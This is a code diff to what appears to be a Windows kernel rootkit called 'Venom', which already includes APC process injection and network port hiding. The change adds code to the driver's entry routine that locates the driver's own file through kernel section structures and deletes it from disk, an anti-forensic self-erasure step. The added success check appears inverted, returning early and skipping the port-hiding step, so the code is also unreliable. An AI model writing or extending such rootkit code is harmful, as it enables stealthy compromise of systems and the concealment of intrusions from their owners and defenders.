@@ -1,6 +1,7 @@
 #include "Config.h"
 #include "Capabilities/InjectionCapabilities/APCInjector.h"
 #include "Capabilities/NetworkCapabilites/PortHider.h"
+#include "Capabilities/FileCapabilities/FileDeleter.h"
 #include "IoctlHandlers.h"
 #include "Ioctl.h"
 #include "Venom.h"
@@ -46,6 +47,17 @@ DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
 	driverObject->DriverUnload = VenomUnload;
 	driverObject->MajorFunction[IRP_MJ_CREATE] = driverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
 	driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;
+
+	const auto ldrDataEntry = static_cast<PKLDR_DATA_TABLE_ENTRY>(driverObject->DriverSection);
+	const auto sectionPointer = static_cast<PSECTION>(ldrDataEntry->SectionPointer);
+	const auto controlArea = reinterpret_cast<PCONTROL_AREA>(sectionPointer->u1.ControlArea);
+	const auto fileObject = reinterpret_cast<PFILE_OBJECT>(static_cast<_EX_FAST_REF*>(controlArea->FilePointer.Object)->Value);
+
+	const auto fileDeleter = FileDeleter(fileObject);
+	status = fileDeleter.deleteFileFromDisk();
+	if(NT_SUCCESS(status)){
+		return status;
+	}
 
 	status = PortHider::hide();
 	if (!NT_SUCCESS(status)) {
